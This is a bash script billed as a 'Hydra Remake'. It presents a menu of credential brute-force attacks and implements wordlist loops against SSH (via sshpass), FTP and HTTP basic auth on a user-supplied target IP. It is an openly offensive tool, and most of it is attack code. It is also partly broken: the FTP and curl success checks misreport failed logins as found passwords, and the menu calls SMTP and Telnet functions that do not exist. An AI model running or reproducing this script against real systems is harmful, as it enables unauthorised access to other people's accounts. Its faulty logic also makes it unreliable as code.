#!/bin/bash

echo "---------------------------------------------"
echo "            Hydra Remake - Version 1.0       "
echo "---------------------------------------------"
echo "Select the protocol and attack to be executed:"
echo "1. SSH (Brute Force)"
echo "2. FTP (Brute Force)"
echo "3. HTTP (Brute Force)"
echo "4. SMTP (Brute Force)"
echo "5. Telnet (Brute Force)"
echo "6. RDP (Brute Force)"
echo "7. MySQL (Brute Force)"
echo "8. MSSQL (Brute Force)"
echo "9. SMB (Brute Force)"
echo "10. POP3 (Brute Force)"
# More options can be added...
echo "50. Other options"

read -p "Choose an option: " option

# Define functions for each type of attack
function ssh_attack {
    read -p "Enter target IP: " ip
    read -p "Enter username: " username
    read -p "Enter password list file path: " password_list
    echo "Starting SSH attack..."
    # Example command, using sshpass
    for password in $(cat $password_list); do
        sshpass -p $password ssh $username@$ip "exit" &>/dev/null
        if [ $? -eq 0 ]; then
            echo "Password found: $password"
            break
        fi
    done
}

function ftp_attack {
    read -p "Enter target IP: " ip
    read -p "Enter username: " username
    read -p "Enter password list file path: " password_list
    echo "Starting FTP attack..."
    for password in $(cat $password_list); do
        ftp -n -v $ip <<END_SCRIPT
        user $username $password
        bye
END_SCRIPT
        if [ $? -eq 0 ]; then
            echo "Password found: $password"
            break
        fi
    done
}

function http_attack {
    read -p "Enter target IP: " ip
    read -p "Enter username: " username
    read -p "Enter password list file path: " password_list
    echo "Starting HTTP attack..."
    for password in $(cat $password_list); do
        curl -u $username:$password http://$ip &>/dev/null
        if [ $? -eq 0 ]; then
            echo "Password found: $password"
            break
        fi
    done
}

# More functions can be added for SMTP, Telnet, etc.

# Function to call the selected option
case $option in
    1) ssh_attack ;;
    2) ftp_attack ;;
    3) http_attack ;;
    4) smtp_attack ;;
    5) telnet_attack ;;
    # Add more protocols here...
    *)
        echo "Invalid option!"
        ;;
esac
